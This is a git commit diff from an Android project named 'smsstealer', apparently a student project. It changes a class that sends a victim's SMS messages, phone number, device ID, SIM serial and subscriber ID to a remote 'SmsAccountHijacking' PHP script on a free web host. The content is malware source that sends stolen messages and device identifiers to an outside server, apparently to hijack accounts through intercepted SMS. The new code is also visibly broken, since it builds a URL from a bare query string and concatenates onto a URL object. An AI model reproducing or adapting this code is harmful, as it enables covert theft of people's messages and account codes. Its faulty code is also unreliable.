c50b3a2874a2b7809b78e14f831bad014dab5d55
AnthonyHewins <aahewins@oakland.edu>
2017-01-29 17:13:12 -0500

    Changes for GET method

--- app/src/main/java/edu/oakland/smsstealer/GetRequest.java
+++ app/src/main/java/edu/oakland/smsstealer/GetRequest.java
@@ -7,18 +7,21 @@ import java.io.IOException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
+import java.net.URLEncoder;
 
 /**
  * Created by anthony on 1/11/17.
  */
 
 public class GetRequest extends AsyncTask {
-    private static final String ASP = "https://110dh.000webhostapp.com/SmsAccountHijacking.php?number=";
+    private static final String ASP = "https://110dh.000webhostapp.com/SmsAccountHijacking2.php?";
     private URL url;
 
     public GetRequest(String number, String message, String simOperator, String deviceId, String networkOperator, String simSerialNumber, String subscriberId) {
         try {
-            url = new URL(ASP + number + "&message=" + message + "&simOperator=" + simOperator + "&deviceId=" + deviceId + "&networkOperator="  + networkOperator + "&simSerialNumber=" + simSerialNumber + "&subscriberId=" + subscriberId);
+            //url = new URL(ASP + number + "&message=" + message + "&simOperator=" + simOperator + "&deviceId=" + deviceId + "&networkOperator="  + networkOperator + "&simSerialNumber=" + simSerialNumber + "&subscriberId=" + subscriberId);
+            URL params = new URL("number=" + number + "&message=" + message + "&simOperator=" + simOperator + "&deviceId=" + deviceId + "&networkOperator="  + networkOperator + "&simSerialNumber=" + simSerialNumber + "&subscriberId=" + subscriberId);
+            url += URLEncoder.encode(params);
         } catch (MalformedURLException e) {
             e.printStackTrace();
         }
